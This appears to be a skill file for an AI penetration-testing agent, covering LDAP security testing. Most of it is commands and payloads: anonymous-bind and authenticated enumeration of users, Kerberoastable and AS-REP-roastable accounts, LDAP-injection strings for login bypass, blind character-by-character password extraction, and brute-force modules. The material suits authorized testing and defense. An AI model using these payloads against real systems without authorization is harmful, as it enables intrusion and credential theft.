<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: ldap
description: LDAP security testing covering injection, anonymous bind, enumeration, LDAP-based auth bypass, and Active Directory LDAP attacks
---

# LDAP Security Testing

LDAP (Lightweight Directory Access Protocol) is the backbone of enterprise authentication. Attack surface: anonymous bind, LDAP injection in login forms, user/group enumeration, and credential extraction via LDAP queries.

---

## Reconnaissance

### Discovery

    # LDAP port discovery
    nmap -p 389,636,3268,3269 <target> -sV --open

    # Ports:
    # 389  — LDAP (plaintext or STARTTLS)
    # 636  — LDAPS (TLS)
    # 3268 — Global Catalog (AD)
    # 3269 — Global Catalog over TLS (AD)

---

## Anonymous Bind

Anonymous bind allows querying without credentials:

    # Test anonymous bind
    ldapsearch -H ldap://<target>:389 -x -s base namingcontexts
    ldapsearch -H ldap://<target>:389 -x -s base "(objectclass=*)"

    # If anonymous bind succeeds, enumerate base DN:
    ldapsearch -H ldap://<target>:389 -x -b "dc=example,dc=com" -s sub "(objectclass=*)"

    # Enumerate users (anonymous):
    ldapsearch -H ldap://<target>:389 -x -b "dc=example,dc=com" \
      "(objectclass=person)" uid sAMAccountName mail userPrincipalName

    # Enumerate groups:
    ldapsearch -H ldap://<target>:389 -x -b "dc=example,dc=com" \
      "(objectclass=group)" cn member

    # Enumerate computers:
    ldapsearch -H ldap://<target>:389 -x -b "dc=example,dc=com" \
      "(objectclass=computer)" cn dNSHostName

    # Get all attributes of a specific user:
    ldapsearch -H ldap://<target>:389 -x -b "dc=example,dc=com" \
      "(sAMAccountName=admin)" *

---

## Authenticated Enumeration

    # Bind with credentials
    ldapsearch -H ldap://<target>:389 -D "cn=user,dc=example,dc=com" -w "password" \
      -b "dc=example,dc=com" -s sub "(objectclass=*)"

    # Enumerate password policy
    ldapsearch -H ldap://<target>:389 -D "user@domain.com" -w "pass" \
      -b "dc=example,dc=com" -s sub "(objectclass=domain)" pwdHistoryLength minPwdLength lockoutThreshold

    # Users with password never expires (high-value targets):
    ldapsearch -H ldap://<target>:389 -D "user@domain.com" -w "pass" \
      -b "dc=example,dc=com" \
      "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))" \
      sAMAccountName

    # Users with no pre-auth (AS-REP roastable):
    ldapsearch -H ldap://<target>:389 -D "user@domain.com" -w "pass" \
      -b "dc=example,dc=com" \
      "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
      sAMAccountName

    # Kerberoastable users (SPN set):
    ldapsearch -H ldap://<target>:389 -D "user@domain.com" -w "pass" \
      -b "dc=example,dc=com" \
      "(&(objectCategory=user)(servicePrincipalName=*))" \
      sAMAccountName servicePrincipalName

---

## LDAP Injection

LDAP injection occurs when user input is embedded in LDAP filter strings without proper escaping.

### Authentication Bypass

Vulnerable login code (conceptually):
```
filter = "(&(uid=" + user + ")(userPassword=" + pass + "))"
```

    # Classic bypass: inject closing parenthesis + wildcard
    # Username: admin)(&
    # Password: anything
    # Resulting filter: (&(uid=admin)(&)(userPassword=anything))
    # The (&) is always true, so auth succeeds

    # Another bypass: wildcard username + true clause
    # Username: *)(&
    # Password: any
    # Resulting filter: (&(uid=*)(&)(userPassword=any))

    # NULL terminator injection (older LDAP implementations):
    # Username: admin\00

### Information Disclosure via Boolean Injection

Extract data character by character using blind LDAP injection:

    # Test if first character of admin password is 'a':
    Username: admin)(userPassword=a*
    # If auth succeeds → first char is 'a'

    # Binary search to enumerate attribute values:
    Username: *)(|(uid=a*)(uid=b*
    Username: admin)(|(cn=a*)(cn=b*

### LDAP Filter Special Characters

Characters requiring escaping in LDAP: `* ( ) \ NUL`

    # Injection probes:
    *
    *)(%00
    *()|%26'
    admin)(!(&(1=0)
    )(cn=*))\00

---

## LDAP in Web Apps

### Common Injection Points

    # Login forms with LDAP backend
    POST /login
    username=admin)(&  &password=anything

    # Search functions
    GET /search?query=*)
    GET /users?uid=*)

    # Directory/lookup features
    GET /lookup?cn=admin)(|(cn=*

### Testing with Payloads

    # Basic injection test (star wildcard to match any):
    username=*
    username=*)
    username=admin*

    # Boolean-based blind injection:
    username=admin)(|(description=a*)(description=b*   # Enumerate attribute
    username=admin)(cn=*)(&(uid=x        # Always-true condition injection

    # Error-based: malformed filters reveal LDAP errors
    username=admin)(
    username=)(

---

## LDAP Over Web Proxies

    # If an app uses LDAP for auth and you can see error messages:
    # Test for verbose error disclosure:
    username=admin
    password=wrong
    # Error: "Invalid credentials 80090308: LdapErr: DSID-0C09044E" → Active Directory
    # Error: "Invalid credentials" → OpenLDAP

    # Error messages often reveal:
    # - Domain structure (dc=...)
    # - LDAP server type (AD vs OpenLDAP)
    # - Attribute names

---

## LDAP Password Extraction

    # If verbose errors enabled or blind injection possible:
    # Enumerate userPassword attribute (OpenLDAP, sometimes cleartext):
    (&(uid=admin)(userPassword=*))    # Check if attribute exists
    (&(uid=admin)(userPassword=a*))   # First char = 'a'?

    # AD stores password hashes, not plaintext, but:
    # unicodePwd attribute (hashed)
    # msDS-PrincipalName, distinguishedName useful for Kerberoasting

---

## LDAP with Python (Automated Testing)

    python3 -c "
    import ldap3
    server = ldap3.Server('ldap://<target>', get_info=ldap3.ALL)
    conn = ldap3.Connection(server, auto_bind=True)
    print(server.info)
    conn.search('dc=example,dc=com', '(objectclass=person)', attributes=['*'])
    for entry in conn.entries:
        print(entry)
    "

---

## Tools

    # ldapsearch (OpenLDAP client)
    ldapsearch -H ldap://<target> -x -b "" -s base +

    # ldapenum
    ldapenum -u user -p pass -d domain.com <dc_ip>

    # enum4linux-ng
    enum4linux-ng -A <target> -u user -p pass

    # nmap LDAP scripts
    nmap --script ldap-brute,ldap-rootdse,ldap-search <target> -p 389

    # Metasploit
    use auxiliary/gather/ldap_query
    use auxiliary/scanner/ldap/ldap_login

---

## Pro Tips

1. Anonymous bind is the first test — many org LDAP servers allow it
2. LDAP injection `*)(&` bypasses auth on vulnerable apps more reliably than SQL injection
3. Wild card `*` in username field on LDAP-based login = auth bypass on misconfigured implementations
4. AD LDAP on port 3268 (Global Catalog) allows querying across all domains in forest
5. Error messages from LDAP auth failures reveal domain structure — always check verbose errors
6. Users with `userAccountControl=65536` (password never expires) = old service accounts, often weak passwords
7. LDAP query results from anonymous bind can include email, phone, manager, department — useful for social engineering

## Summary

LDAP testing = anonymous bind enumeration + LDAP injection in login forms + user/group discovery. Anonymous bind to Active Directory is surprisingly common and yields the full user directory. LDAP injection with `*)(&` bypasses authentication in apps that don't sanitize LDAP filters. Always test the login form with LDAP-specific payloads if the app is on an enterprise network.
